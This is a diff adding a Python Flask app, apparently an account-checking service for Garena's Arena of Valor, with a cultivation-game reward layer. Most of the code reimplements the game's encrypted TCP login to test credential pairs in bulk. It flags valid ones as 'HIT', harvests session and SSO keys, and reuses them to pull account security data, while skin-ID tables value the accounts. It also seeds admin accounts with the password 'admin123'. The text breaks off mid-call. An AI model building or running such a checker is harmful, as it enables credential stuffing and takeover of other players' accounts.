@@ -1,0 +1,2345 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+================================================================================
+AOV INSPECTOR - NEON MATRIX EDITION
+================================================================================
+Giao diện độc quyền: Matrix Terminal + Neon Glow + Mobile-First Bottom Nav
+Thiết kế hoàn toàn khác biệt - không template nào giống
+================================================================================
+"""
+
+import os
+import json
+import time
+import uuid
+import random
+import hashlib
+import threading
+import logging
+import zipfile
+import shutil
+import struct
+import socket
+from datetime import datetime
+from functools import wraps
+from typing import Dict, List, Tuple, Optional
+
+from flask import (
+    Flask, render_template_string, request, jsonify, session,
+    redirect, url_for, send_file, flash
+)
+from werkzeug.utils import secure_filename
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ============================ CONFIG ============================
+APP_SECRET = os.environ.get("APP_SECRET", "neon_matrix_2024_ultra_secret")
+DATA_FILE = "web_data.json"
+DATA_BACKUP_FILE = "web_data_backup.json"
+DATA_TMP_FILE = "web_data.json.tmp"
+UPLOAD_FOLDER = "uploads"
+
+MAX_CONCURRENT_CHECKS = 50
+TCP_LOGIN_TIMEOUT = 15
+MAX_RETRIES = 3
+
+REFERRAL_REWARD = 100
+REFERRAL_BONUS = 20
+DEFAULT_BALANCE = 400
+DAILY_REWARD = 10
+
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+app = Flask(__name__)
+app.secret_key = APP_SECRET
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+logger = logging.getLogger(__name__)
+
+# ============================ DATA STORES ============================
+USERS: Dict[str, dict] = {}
+GENERATED_KEYS: Dict[str, dict] = {}
+NOTIFICATIONS: List[dict] = []
+_lock = threading.Lock()
+
+# ============================ CULTIVATION DATA ============================
+CULTIVATION_LEVELS = [
+    {"name": "Luyện Khí", "exp": 0, "hp": 100, "atk": 20, "def": 10},
+    {"name": "Trúc Cơ", "exp": 100, "hp": 200, "atk": 40, "def": 20},
+    {"name": "Kim Đan", "exp": 300, "hp": 400, "atk": 80, "def": 40},
+    {"name": "Nguyên Anh", "exp": 700, "hp": 800, "atk": 160, "def": 80},
+    {"name": "Hóa Thần", "exp": 1500, "hp": 1500, "atk": 300, "def": 150},
+    {"name": "Luyện Hư", "exp": 3000, "hp": 3000, "atk": 600, "def": 300},
+    {"name": "Hợp Thể", "exp": 6000, "hp": 6000, "atk": 1200, "def": 600},
+    {"name": "Đại Thừa", "exp": 12000, "hp": 12000, "atk": 2400, "def": 1200},
+    {"name": "Chân Tiên", "exp": 30000, "hp": 30000, "atk": 6000, "def": 3000},
+    {"name": "Kim Tiên", "exp": 80000, "hp": 80000, "atk": 16000, "def": 8000},
+    {"name": "Đại La Kim Tiên", "exp": 200000, "hp": 200000, "atk": 40000, "def": 20000},
+    {"name": "Tiên Đế", "exp": 500000, "hp": 500000, "atk": 100000, "def": 50000},
+    {"name": "Thần Vương", "exp": 1000000, "hp": 1000000, "atk": 200000, "def": 100000},
+    {"name": "Bán Tiên", "exp": 2000000, "hp": 2000000, "atk": 400000, "def": 200000},
+    {"name": "Chuẩn Thánh", "exp": 4000000, "hp": 4000000, "atk": 800000, "def": 400000},
+    {"name": "Thánh Nhân", "exp": 8000000, "hp": 8000000, "atk": 1600000, "def": 800000},
+    {"name": "Đại Thánh", "exp": 16000000, "hp": 16000000, "atk": 3200000, "def": 1600000},
+    {"name": "Chuẩn Đế", "exp": 32000000, "hp": 32000000, "atk": 6400000, "def": 3200000},
+    {"name": "Đế Cảnh", "exp": 64000000, "hp": 64000000, "atk": 12800000, "def": 6400000},
+    {"name": "Chí Tôn", "exp": 128000000, "hp": 128000000, "atk": 25600000, "def": 12800000},
+    {"name": "Bất Diệt", "exp": 256000000, "hp": 256000000, "atk": 51200000, "def": 25600000},
+    {"name": "Hỗn Nguyên", "exp": 512000000, "hp": 512000000, "atk": 102400000, "def": 51200000},
+    {"name": "Đạo Tổ", "exp": 1024000000, "hp": 1024000000, "atk": 204800000, "def": 102400000},
+    {"name": "Lọ Vương", "exp": 2048000000, "hp": 2048000000, "atk": 409600000, "def": 204800000},
+    {"name": "Đại Đế", "exp": 4096000000, "hp": 4096000000, "atk": 819200000, "def": 409600000},
+    {"name": "VÔ ĐỊCH", "exp": 10000000000, "hp": 10000000000, "atk": 2000000000, "def": 1000000000},
+    {"name": "Siêu Thần", "exp": 20000000000, "hp": 20000000000, "atk": 4000000000, "def": 2000000000},
+    {"name": "Thần Tổ", "exp": 40000000000, "hp": 40000000000, "atk": 8000000000, "def": 4000000000},
+    {"name": "Vũ Trụ Chi Chủ", "exp": 80000000000, "hp": 80000000000, "atk": 16000000000, "def": 8000000000},
+    {"name": "Đa Nguyên Tối Thượng", "exp": 160000000000, "hp": 160000000000, "atk": 32000000000, "def": 16000000000},
+    {"name": "Vô Hạn Siêu Việt", "exp": 320000000000, "hp": 320000000000, "atk": 64000000000, "def": 32000000000},
+    {"name": "Toàn Năng Chí Tôn", "exp": 640000000000, "hp": 640000000000, "atk": 128000000000, "def": 64000000000},
+    {"name": "Bất Khả Chiến Bại", "exp": 1280000000000, "hp": 1280000000000, "atk": 256000000000, "def": 128000000000},
+    {"name": "Vĩnh Hằng Chí Cao", "exp": 2560000000000, "hp": 2560000000000, "atk": 512000000000, "def": 256000000000},
+    {"name": "Sáng Thế Thần", "exp": 5120000000000, "hp": 5120000000000, "atk": 1024000000000, "def": 512000000000},
+    {"name": "Chúa Tể Vạn Vật", "exp": 10240000000000, "hp": 10240000000000, "atk": 2048000000000, "def": 1024000000000},
+    {"name": "Đấng Sáng Tạo", "exp": 20480000000000, "hp": 20480000000000, "atk": 4096000000000, "def": 2048000000000},
+    {"name": "Toàn Tri Toàn Năng", "exp": 40960000000000, "hp": 40960000000000, "atk": 8192000000000, "def": 4096000000000},
+    {"name": "VÔ THƯỢNG CHÍ TÔN", "exp": 100000000000000, "hp": 100000000000000, "atk": 20000000000000, "def": 10000000000000},
+]
+
+MON_PHAI = {
+    "thien_kiem": {"name": "Thiên Kiếm", "bonus_atk": 20, "bonus_def": 0, "bonus_hp": 0, "bonus_exp": 10},
+    "cuu_long": {"name": "Cửu Long", "bonus_atk": 0, "bonus_def": 20, "bonus_hp": 0, "bonus_exp": 10},
+    "thien_am": {"name": "Thiên Âm", "bonus_atk": 0, "bonus_def": 0, "bonus_hp": 50, "bonus_exp": 10},
+    "huyen_mon": {"name": "Huyền Môn", "bonus_atk": 15, "bonus_def": 15, "bonus_hp": 0, "bonus_exp": 20},
+    "vo_cuc": {"name": "Vô Cực", "bonus_atk": 25, "bonus_def": 0, "bonus_hp": 0, "bonus_exp": 5},
+    "thai_at": {"name": "Thái Ất", "bonus_atk": 0, "bonus_def": 25, "bonus_hp": 0, "bonus_exp": 5},
+    "cuu_uy": {"name": "Cửu U", "bonus_atk": 30, "bonus_def": 0, "bonus_hp": 0, "bonus_exp": 0},
+    "hon_don": {"name": "Hỗn Độn", "bonus_atk": 0, "bonus_def": 30, "bonus_hp": 30, "bonus_exp": 0},
+}
+
+DAN_DUOC = {
+    "linh_dan": {"name": "Linh Đan", "effect": "exp+50", "cost": {"thao_duoc": 2}},
+    "phap_dan": {"name": "Pháp Đan", "effect": "atk+5", "cost": {"thao_duoc": 3, "khoang_thach": 1}},
+    "thuong_dan": {"name": "Thương Đan", "effect": "hp+50", "cost": {"thao_duoc": 3, "tinh_huyet": 1}},
+    "tien_dan": {"name": "Tiên Đan", "effect": "exp+200", "cost": {"thao_duoc": 5, "tinh_huyet": 2, "khoang_thach": 2}},
+}
+
+VU_KHI = {
+    "pham_kiem": {"name": "Phàm Kiếm", "atk": 10, "cost": 20},
+    "thanh_kiem": {"name": "Thanh Kiếm", "atk": 30, "cost": 60},
+    "truong_kiem": {"name": "Trường Kiếm", "atk": 60, "cost": 120},
+    "than_khi": {"name": "Thần Khí", "atk": 100, "cost": 200},
+    "long_kiem": {"name": "Long Kiếm", "atk": 200, "cost": 400},
+    "phuong_kiem": {"name": "Phượng Kiếm", "atk": 350, "cost": 700},
+    "than_kiem": {"name": "Thần Kiếm", "atk": 550, "cost": 1100},
+    "huyet_kiem": {"name": "Huyết Kiếm", "atk": 800, "cost": 1600},
+    "tien_kiem": {"name": "Tiên Kiếm", "atk": 1200, "cost": 2400},
+    "than_kiem_vu_tru": {"name": "Thần Kiếm Vũ Trụ", "atk": 2000, "cost": 4000},
+}
+
+MISSION_MILESTONES = [50, 100, 300, 500, 1000, 2000, 5000, 10000]
+MISSION_REWARDS = {50: 50, 100: 100, 300: 300, 500: 500, 1000: 1000, 2000: 2000, 5000: 5000, 10000: 10000}
+
+# ============================ HELPERS ============================
+def gen_id():
+    return "AOV-" + uuid.uuid4().hex[:4].upper() + "-" + uuid.uuid4().hex[:4].upper()
+
+def hash_password(password):
+    return hashlib.sha256((password + APP_SECRET).encode()).hexdigest()
+
+def save_data():
+    try:
+        with _lock:
+            data = {"users": USERS, "generated_keys": GENERATED_KEYS,
+                    "notifications": NOTIFICATIONS[-100:]}
+            with open(DATA_TMP_FILE, "w", encoding="utf-8") as f:
+                json.dump(data, f, ensure_ascii=False, indent=2)
+                f.flush()
+                os.fsync(f.fileno())
+            if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
+                try: shutil.copy2(DATA_FILE, DATA_BACKUP_FILE)
+                except Exception: pass
+            os.replace(DATA_TMP_FILE, DATA_FILE)
+    except Exception as e:
+        logger.error(f"Save error: {e}")
+
+def load_data():
+    global USERS, GENERATED_KEYS, NOTIFICATIONS
+    data = None
+    for fname in (DATA_FILE, DATA_BACKUP_FILE):
+        if not os.path.exists(fname): continue
+        try:
+            if os.path.getsize(fname) == 0: continue
+            with open(fname, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            break
+        except Exception:
+            data = None
+    if data is None: return
+    USERS = data.get("users", {})
+    GENERATED_KEYS = data.get("generated_keys", {})
+    NOTIFICATIONS = data.get("notifications", [])
+
+def create_admin_accounts():
+    for username in ["admin", "admin2"]:
+        if username not in USERS:
+            USERS[username] = {
+                "id": gen_id(), "username": username,
+                "password": hash_password("admin123"),
+                "balance": 999999999, "temp_balance": 0,
+                "referrals": 0, "is_admin": True,
+                "created_at": time.time(), "last_checkin": 0,
+                "last_notif_read": 0, "checkin_streak": 0, "total_checkins": 0,
+                "cultivation": {"level": len(CULTIVATION_LEVELS) - 1,
+                                "exp": CULTIVATION_LEVELS[-1]["exp"],
+                                "hp": CULTIVATION_LEVELS[-1]["hp"],
+                                "atk": CULTIVATION_LEVELS[-1]["atk"],
+                                "def": CULTIVATION_LEVELS[-1]["def"],
+                                "weapon": None, "mon_phai": None, "mon_phai_level": 0},
+                "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []},
+                "history": [],
+            }
+    save_data()
+
+def login_required(f):
+    @wraps(f)
+    def deco(*a, **k):
+        if "username" not in session: return redirect(url_for("login_page"))
+        return f(*a, **k)
+    return deco
+
+def admin_required(f):
+    @wraps(f)
+    def deco(*a, **k):
+        if "username" not in session: return redirect(url_for("login_page"))
+        u = USERS.get(session["username"])
+        if not u or not u.get("is_admin"):
+            flash("Không có quyền!", "error")
+            return redirect(url_for("dashboard"))
+        return f(*a, **k)
+    return deco
+
+def get_current_user():
+    if "username" not in session: return None
+    return USERS.get(session["username"])
+
+def get_unread_count(username):
+    u = USERS.get(username)
+    if not u: return 0
+    lr = u.get("last_notif_read", 0)
+    return sum(1 for n in NOTIFICATIONS if n.get("timestamp", 0) > lr)
+
+def mark_read(username):
+    u = USERS.get(username)
+    if u:
+        u["last_notif_read"] = time.time()
+        save_data()
+
+# ============================ SKIN DATA ============================
+SKIN_SSS = {
+    "54307": "Aya Công chúa cầu vồng", "19908": "Eland'orr Mộng giới thần chủ",
+    "15412": "Yena Huyền cửu thiên", "19007": "Tulen Chí tôn kiếm tiên",
+    "19009": "Tulen Thần sứ ST.L-79", "50105": "Tel'Annas Thần sứ F.E.E-X1",
+    "52414": "Capheny Càn Nguyên Điện Chủ", "52011": "Veres Lưu ly Long mẫu",
+    "13011": "Airi Bích hải thánh nữ", "13015": "Airi Thứ nguyên Vệ thần",
+    "13613": "Ilumia Lưỡng Nghi Long Hậu", "11607": "Butterfly Phượng Cửu Thiên",
+    "12912": "Triệu Vân Minh Chung Long Đế", "15009": "Nakroth thứ nguyên vệ thần",
+    "11107": "Violet Thứ nguyên vệ thần", "11119": "Violet Vọng nguyệt Long Cơ",
+    "13314": "Valhein Thứ nguyên vệ thần", "15217": "Điêu Thuyền Nhật Nguyệt Thánh Linh",
+    "10620": "Krixi Phù thủy thời không", "13118": "Murad Thiên Luân Kiếm Thánh",
+    "14111": "Lauriel Thứ nguyên vệ thần", "15710": "Raz Bão vũ Cuồng lôi",
+    "13110": "Hayate Tu Di Thánh Đế",
+}
+
+SKIN_SS = {
+    "59901": "Billow Thiên Tướng - Độ Ách", "59802": "Bolt Baron Thiên Phủ - Tư Mệnh",
+    "15905": "Dolia Mã Khởi Thiên Ca", "54802": "Bijan Hoàng kim cơ giáp",
+    "54507": "Yue Hỗn Độn Thần Ma", "53701": "Allain Kirito Hắc kiếm sĩ",
+    "51306": "Zata Chí tôn Tà Phượng", "19109": "Rouie Linh Sứ Thời không",
+    "52404": "Capheny Kimono", "13705": "Paine Tử xà Bá tước",
+    "13204": "Hayate Tử thần vũ trụ", "13212": "Hayate Thống soái Dạ Ưng",
+    "56703": "Erin Tình yêu cổ tích", "51208": "Rourke Bách tướng Lão đại",
+    "52007": "Veres Kimono", "13005": "Airi Kiemono",
+    "52113": "Florentino Kỷ Nguyên Hổ Phách", "52709": "Sephera Bách nhạn ngân linh",
+    "51802": "Quillen Đặc công mãng xà", "51504": "Richter Kiếm thần Susanoo",
+    "19605": "Elsu Sứ giả tận thế", "50604": "Omen Đao phủ tận thế",
+    "52304": "D'arcy Pháp sư hỏa long", "15007": "Nakroth Lôi Quang Sứ",
+    "13104": "Murad Siêu việt", "16607": "Arthur Siêu Việt",
+    "16703": "Ngộ Không Siêu việt", "12304": "Maloch Đại Tướng Robot",
+    "18408": "Helen Bé Hoa Xuân", "10603": "Krixi Tiệc Bãi Biển",
+    "10912": "Veera A.I Love you", "15202": "Điêu Thuyền Tiệc bãi biển",
+    "12801": "Lữ Bố Tiệc Bãi Biển", "11202": "Yorn Thế Tử Nguyệt Tộc",
+    "10801": "Gildur Tiệc Bãi Biển", "11808": "Alice Quân nhạc Athanor",
+    "11604": "Butterfly Nữ Quái Nổi Loạn", "12008": "Mina Linh Xà yêu vũ",
+    "11105": "Violet Tiệc bãi biển", "13302": "Valhein Vũ khí tối thượng",
+}
+
+SKIN_ANIME = {
+    "59702": "Biron Yuji Itadori", "52809": "Qi Milim Nava", "54402": "Yan Tanjiro Kamado",
+    "54309": "Aya Cinnamoroll's Dream", "53806": "Iggy Rimuru Tempest", "54002": "Bright Toshiro Hitsugaya",
+    "18906": "Krizzix Cursed Corpse", "53107": "Keera Nezuko Kamado",
+    "19506": "Enzo Sát quỷ đoàn", "52204": "Errol Genos",
+    "52407": "Capheny Harley Quinn", "13706": "Paine Megumi Fushiguro",
+    "13213": "Hayate Siêu đạo chích Kid", "52110": "Florentino Hisoka",
+    "11215": "Yorn Conan Edogawa", "12808": "Lữ Bố Ichigo Kurosaki",
+    "13111": "Murad Byakuya Kuchiki", "10611": "Krixi Terrible Tornado",
+    "15012": "Nakroth Killua", "11611": "Butterfly Stacia",
+}
+
+HERO_MAP = {
+    "105": "Toro", "106": "Krixi", "107": "Zephys", "108": "Gildur", "109": "Veera",
+    "110": "Kahlii", "111": "Violet", "112": "Yorn", "113": "Chaugnar", "114": "Omega",
+    "115": "Jinna", "116": "Butterfly", "117": "Ormarr", "118": "Alice", "119": "Mganga",
+    "120": "Mina", "121": "Marja", "123": "Maloch", "124": "Ignis", "126": "Arduin",
+    "127": "Azzen'Ka", "128": "Lữ Bố", "129": "Triệu Vân", "130": "Airi", "131": "Murad",
+    "132": "Hayate", "133": "Valhein", "134": "Skud", "135": "Thane", "136": "Ilumia",
+    "137": "Paine", "139": "Kil'Groth", "140": "Superman", "141": "Lauriel", "142": "Natalya",
+    "144": "Taara", "146": "Zill", "148": "Preyta", "149": "Xeniel", "150": "Nakroth",
+    "152": "Điêu Thuyền", "153": "Kaine", "154": "Yena", "156": "Aleister", "157": "Raz",
+    "159": "Dolia", "162": "Kriknak", "163": "Ryoma", "166": "Arthur", "167": "Ngộ Không",
+    "168": "Lumburr", "169": "Slimz", "170": "Moren", "171": "Cresht", "173": "Fennik",
+    "174": "Stuart", "175": "Grakk", "177": "Lindis", "180": "Max", "184": "Helen",
+    "186": "TeeMee", "187": "Arum", "189": "Krizzix", "190": "Tulen", "191": "Rouie",
+    "192": "Celica", "193": "Amily", "195": "Enzo", "196": "Elsu",
+    "199": "Eland'orr", "206": "Charlotte", "501": "Tel'Annas", "502": "Astrid",
+    "503": "Zuka", "506": "Omen", "509": "Y'bneth", "510": "Liliana",
+    "512": "Rourke", "513": "Zata", "515": "Richter", "518": "Quillen",
+    "519": "Annette", "520": "Veres", "521": "Florentino", "522": "Errol",
+    "523": "D'Arcy", "524": "Capheny", "525": "Zip", "526": "Ishar",
+    "527": "Sephera", "528": "Qi", "529": "Volkath", "530": "Dirak",
+    "531": "Keera", "532": "Thorne", "533": "Laville", "534": "Dextra",
+    "535": "Sinestrea", "536": "Aoi", "537": "Allain", "538": "Iggy",
+    "539": "Lorion", "540": "Bright", "541": "Bonnie", "542": "Tachi",
+    "543": "Aya", "544": "Yan", "545": "Yue", "546": "Teeri",
+    "548": "Bijan", "563": "Heino", "567": "Erin", "568": "Ming",
+    "577": "ShaoSiYuan", "582": "Ciyuanfashi", "584": "CiYuansheshou",
+    "593": "MaChao", "595": "LiXin", "596": "Goverra", "597": "Biron",
+    "598": "Bolt Baron", "599": "Billow"
+}
+
+# ============================ TCP LOGIN ============================
+HOST = "103.247.205.14"
+PORT = 19000
+CLIENT_PLATFORM_ANDROID = 17
+CLIENT_VERSION = 283
+CLIENT_TYPE = 4352
+CMD_LOGIN_PREPARE = 256
+CMD_LOGIN = 257
+CMD_SSO_KEY_GET = 442
+PACKET_VERSION = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION
+CLIENT_ID_MASK = 4354
+_pkt_counter = random.randint(0, 0x3FFFFF)
+_XTEA_DELTA = 0x9E3779B9
+_XTEA_ROUNDS = 32
+
+def _mix(v): return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)
+
+def _xtea_enc(v0, v1, key):
+    k = struct.unpack('<4I', key); s = 0
+    for _ in range(_XTEA_ROUNDS):
+        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
+        s = (s + _XTEA_DELTA) & 0xFFFFFFFF
+        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
+    return v0, v1
+
+def _xtea_dec(v0, v1, key):
+    k = struct.unpack('<4I', key); s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
+    for _ in range(_XTEA_ROUNDS):
+        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
+        s = (s - _XTEA_DELTA) & 0xFFFFFFFF
+        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
+    return v0, v1
+
+def xtea_encrypt(data, key):
+    pad = 8 - len(data) % 8
+    data = data + bytes([pad] * pad)
+    R = struct.unpack('<Q', os.urandom(8))[0]
+    enc_R = struct.pack('<2I', *_xtea_enc(*struct.unpack('<2I', struct.pack('<Q', R)), key))
+    prev = enc_R; out = bytearray(enc_R); pt_sum = R; last_ct = enc_R
+    for i in range(0, len(data), 8):
+        pb = data[i:i+8]
+        pt_sum = (pt_sum + struct.unpack('<Q', pb)[0]) & 0xFFFFFFFFFFFFFFFF
+        blk = bytes(a ^ b for a, b in zip(pb, prev))
+        v0, v1 = _xtea_enc(*struct.unpack('<2I', blk), key)
+        prev = struct.pack('<2I', v0, v1); last_ct = prev; out.extend(prev)
+    ci = struct.unpack('<Q', last_ct)[0] ^ pt_sum
+    ce = struct.pack('<2I', *_xtea_enc(*struct.unpack('<2I', struct.pack('<Q', ci)), key))
+    out.extend(ce)
+    return bytes(out)
+
+def xtea_decrypt(data, key):
+    if len(data) < 24 or len(data) % 8 != 0: return data
+    iv = data[:8]; body = data[8:-8]
+    out = bytearray(); prev = iv
+    for i in range(0, len(body), 8):
+        blk = body[i:i+8]
+        v0, v1 = _xtea_dec(*struct.unpack('<2I', blk), key)
+        out.extend(bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev)))
+        prev = blk
+    if out:
+        pad = out[-1]
+        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]): out = out[:-pad]
+    return bytes(out)
+
+def _vint(n):
+    o = bytearray()
+    while n > 0x7F:
+        o.append((n & 0x7F) | 0x80); n >>= 7
+    o.append(n & 0x7F); return bytes(o)
+
+def _pfv(t, n): return _vint((t << 3) | 0) + _vint(n)
+def _pfb(t, b): return _vint((t << 3) | 2) + _vint(len(b)) + b
+def _pfs(t, s): return _pfb(t, s.encode('utf-8'))
+
+def _pdecode(data):
+    f = {}; pos = 0
+    def _st(fn, v):
+        if fn in f:
+            p = f[fn]
+            if isinstance(p, list): p.append(v)
+            else: f[fn] = [p, v]
+        else: f[fn] = v
+    while pos < len(data):
+        try:
+            key = 0; sh = 0
+            while True:
+                b = data[pos]; pos += 1
+                key |= (b & 0x7F) << sh
+                if not (b & 0x80): break
+                sh += 7
+            fn, wt = key >> 3, key & 7
+            if wt == 0:
+                v = 0; sh = 0
+                while True:
+                    b = data[pos]; pos += 1
+                    v |= (b & 0x7F) << sh
+                    if not (b & 0x80): break
+                    sh += 7
+                _st(fn, v)
+            elif wt == 2:
+                ln = 0; sh = 0
+                while True:
+                    b = data[pos]; pos += 1
+                    ln |= (b & 0x7F) << sh
+                    if not (b & 0x80): break
+                    sh += 7
+                _st(fn, data[pos:pos+ln]); pos += ln
+            else: break
+        except IndexError: break
+    return f
+
+def _pget(f, t, d=None):
+    v = f.get(t, d)
+    if isinstance(v, list): return v[-1] if v else d
+    return v
+
+def _nid():
+    global _pkt_counter
+    _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
+    return CLIENT_ID_MASK | _pkt_counter
+
+def _bframe(cmd, body):
+    hdr = (_pfv(1, PACKET_VERSION) + _pfv(2, _nid()) + _pfv(3, 2) +
+           _pfv(4, cmd) + _pfv(6, int(time.time())))
+    p = struct.pack('>H', len(hdr)) + hdr + body
+    return struct.pack('<I', len(p)) + p
+
+def _recvall(s, n):
+    b = b''
+    while len(b) < n:
+        c = s.recv(n - len(b))
+        if not c: raise ConnectionError("drop")
+        b += c
+    return b
+
+def _rframe(s):
+    sz = struct.unpack('<I', _recvall(s, 4))[0]
+    p = _recvall(s, sz)
+    hl = struct.unpack('>H', p[:2])[0]
+    rh = _pdecode(p[2:2+hl])
+    h = {k: (_pget(rh, k) if isinstance(v, list) else v) for k, v in rh.items()}
+    return h, p[2+hl:]
+
+def _rcframe(s, tc, mt=5):
+    for _ in range(mt):
+        h, b = _rframe(s)
+        if h.get(4, 0) == tc: return h, b
+    return {}, b''
+
+def _atype(a):
+    if a.isdigit(): return 3
+    if '@' in a: return 2
+    return 1
+
+def _blprep(acc, rk):
+    inner = (_pfv(1, 0) + _pfv(2, _atype(acc)) + _pfs(3, acc) +
+             _pfv(4, CLIENT_TYPE) + _pfv(5, CLIENT_VERSION))
+    return _pfb(1, rk) + _pfb(2, xtea_encrypt(inner, rk))
+
+def _dlkey(pw, salt, vc):
+    m = hashlib.md5(pw.encode()).hexdigest()
+    ir = hashlib.sha256((m + salt).encode()).digest()
+    k = hashlib.sha256((ir.hex() + vc).encode()).digest()[:16]
+    return k, m.encode('ascii')
+
+def _blogin(acc, pw, salt, vc):
+    k, ph = _dlkey(pw, salt, vc)
+    did = hashlib.md5(acc.encode()).digest()
+    usb = _pfv(2, 4608)
+    inner = _pfb(1, ph) + _pfv(2, 0) + _pfb(3, usb) + _pfb(4, did)
+    return _pfb(1, xtea_encrypt(inner, k)), k
+
+def _rfenc(s, sk):
+    sz = struct.unpack('<I', _recvall(s, 4))[0]
+    ep = _recvall(s, sz)
+    p = xtea_decrypt(ep, sk)
+    hl = struct.unpack('>H', p[:2])[0]
+    rh = _pdecode(p[2:2+hl])
+    h = {k: (_pget(rh, k) if isinstance(v, list) else v) for k, v in rh.items()}
+    return h, p[2+hl:]
+
+def _senc(s, cmd, body, sk, to=5):
+    ot = s.gettimeout()
+    try:
+        s.settimeout(to)
+        hdr = (_pfv(1, PACKET_VERSION) + _pfv(2, _nid()) + _pfv(3, 2) +
+               _pfv(4, cmd) + _pfv(6, int(time.time())))
+        p = struct.pack('>H', len(hdr)) + hdr + body
+        ep = xtea_encrypt(p, sk)
+        s.sendall(struct.pack('<I', len(ep)) + ep)
+        for _ in range(5):
+            h2, b2 = _rfenc(s, sk)
+            if h2.get(4, 0) == cmd: return h2, b2
+        return {}, b''
+    finally:
+        try: s.settimeout(ot)
+        except: pass
+
+def _fsso(s, sk):
+    try:
+        h, b = _senc(s, CMD_SSO_KEY_GET, b'', sk, 5)
+        if h.get(5, 0) != 0: return {}
+        f = _pdecode(b)
+        sso = _pget(f, 1)
+        if sso is not None:
+            return {'sso_key': sso.decode('utf-8') if isinstance(sso, bytes) else str(sso)}
+    except: pass
+    return {}
+
+def tcp_login(acc, pw, timeout=15):
+    s = None
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((HOST, PORT))
+        rk = os.urandom(16)
+        s.sendall(_bframe(CMD_LOGIN_PREPARE, _blprep(acc, rk)))
+        h, b = _rcframe(s, CMD_LOGIN_PREPARE, 5)
+        if h.get(5, 0) != 0:
+            return {'status': 'ERROR', 'detail': f'PREPARE_FAIL={h.get(5)}'}
+        pr = _pdecode(b)
+        rkey = _pget(pr, 1, b''); rdata = _pget(pr, 2, b'')
+        if not rkey or not rdata:
+            return {'status': 'ERROR', 'detail': 'EmptyPrepare'}
+        pd = _pdecode(xtea_decrypt(rdata, rkey))
+        salt = _pget(pd, 1, b'').decode('utf-8', errors='ignore')
+        vc = _pget(pd, 2, b'').decode('utf-8', errors='ignore')
+        lb, k = _blogin(acc, pw, salt, vc)
+        s.sendall(_bframe(CMD_LOGIN, lb))
+        h, b = _rcframe(s, CMD_LOGIN, 5)
+        if h.get(5, 0) != 0:
+            return {'status': 'INVALID', 'detail': f'LOGIN_FAIL={h.get(5)}'}
+        lr = _pdecode(b)
+        er = _pget(lr, 1, b'')
+        if not er:
+            return {'status': 'ERROR', 'detail': 'EmptyLoginReply'}
+        rd = _pdecode(xtea_decrypt(er, k))
+        uid = _pget(rd, 1, 0)
+        sk = _pget(rd, 2, b'')
+        if not uid: return {'status': 'ERROR', 'detail': 'UID=0'}
+        if not isinstance(sk, bytes) or len(sk) != 16:
+            return {'status': 'ERROR', 'detail': 'BadKey'}
+        res = {'status': 'HIT', 'uid': uid, 'session_key': sk.hex()}
+        sso = _fsso(s, sk)
+        if sso.get('sso_key'): res['sso_key'] = sso['sso_key']
+        return res
+    except socket.timeout:
+        return {'status': 'TIMEOUT', 'detail': 'Timeout'}
+    except Exception as e:
+        return {'status': 'ERROR', 'detail': str(e)}
+    finally:
+        if s:
+            try: s.close()
+            except: pass
+
+APP_ID = "100054"
+CONNECT_AUTH_URL = f"https://{APP_ID}.connect.garena.com"
+UA = "Mozilla/5.0 (Linux; Android 9; SM-S9280) AppleWebKit/537.36 Chrome/124 Mobile Safari/537.36"
+COOKIE_BASE = "apple_state_key=179d1b269c5711f1846f0ebfc742fc72; fb_state=ae05815a37ec4b91b695c41cc9516001"
+
+class GarenaPipeline:
+    def __init__(self, u, p):
+        self.username = u; self.password = p
+        self.sso_key = None; self.garena_uid = 0; self.last_error = ""
+
+    def login_full(self):
+        r = tcp_login(self.username, self.password, TCP_LOGIN_TIMEOUT)
+        if r.get('status') != 'HIT':
+            self.last_error = r.get('detail', 'Fail')
+            return False
+        self.garena_uid = r.get('uid', 0)
+        self.sso_key = r.get('sso_key')
+        return True
+
+    def _grant(self, redirect):
+        if not self.sso_key: return None
+        try:
+            s = requests.Session(); s.verify = False
+            gp = {"client_id": APP_ID, "response_type": "code",
+                  "redirect_uri": redirect, "login_scenario": "normal",
+                  "format": "json", "id": str(int(time.time() * 1000))}
+            gh = {"User-Agent": UA, "Origin": f"https://{APP_ID}.connect.garena.com",
+                  "Referer": f"https://{APP_ID}.connect.garena.com/",
+                  "Cookie": f"{COOKIE_BASE}; sso_key={self.sso_key}"}
+            r = s.post(f"{CONNECT_AUTH_URL}/oauth/token/grant",
+                       data=gp, headers=gh, timeout=10).json()
+            return r.get("code")
+        except: return None
+
+    def fetch_account_security(self):
+        code = self._grant("https://identity.garena.com/account_info")
+        if not code: return None
+        try:
+            s = requests.Session(); s.verify = False
+            s.get(f"https://identity.garena.com/account_info?code={code}",
+                  headers={"User-Agent": UA}, timeout=10)
+            r = s.get("https://identity.garena.com/api/account/info",
+                      headers={"User-Agent": UA, "Referer": "https://identity.garena.com/account_info"},
